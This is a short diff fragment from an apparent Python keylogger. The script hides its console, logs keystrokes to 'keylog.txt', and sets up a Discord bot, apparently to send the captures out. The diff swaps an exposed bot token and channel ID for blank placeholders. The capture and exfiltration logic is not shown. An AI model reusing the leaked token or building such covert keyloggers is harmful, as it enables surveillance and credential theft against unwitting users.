@@ -24,8 +24,8 @@ hide_console()
 logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")
 
 # Discord bot setup
-TOKEN = 'MTI0OTE4NDE3NzQzNDM5NDY3Ng.GxzyiG.ORJtNts91cBdHU1ybeINy5njEGFtFaqxLN_Ntg'  # Replace with your bot's token
-CHANNEL_ID = 1249184809075478601  # Replace with your channel ID
+TOKEN = ''  # Replace with your bot's token
+CHANNEL_ID =   # Replace with your channel ID
 
 # Define intents
 intents = discord.Intents.default()
